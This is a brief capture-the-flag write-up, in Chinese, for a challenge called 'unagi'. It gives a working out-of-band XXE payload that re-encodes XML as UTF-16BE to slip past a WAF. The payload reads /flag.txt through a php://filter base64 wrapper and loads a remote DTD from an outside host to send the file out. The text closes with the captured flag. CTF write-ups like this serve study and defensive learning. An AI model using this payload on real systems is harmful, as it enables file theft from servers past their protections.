# unagi

基本上就是很明顯的XXE

但是有WAF各種擋

考點就是這篇的內容: https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0

換個編碼就能繞過WAF:

`echo -n "<?xml version=\"1.0\" encoding=\"UTF-16BE\"" > payload.xml`

`cat oob.xml | iconv -f UTF-8 -t UTF-16BE >> payload.xm`

其中`oob.xml`為:

```xml
?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % remote SYSTEM "http://kaibro.tw/xxe.dtd">
%remote;
%all;
%send;
]>
```

Out of band XXE把flag.txt傳回來:

`flag{n0w_i'm_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}`
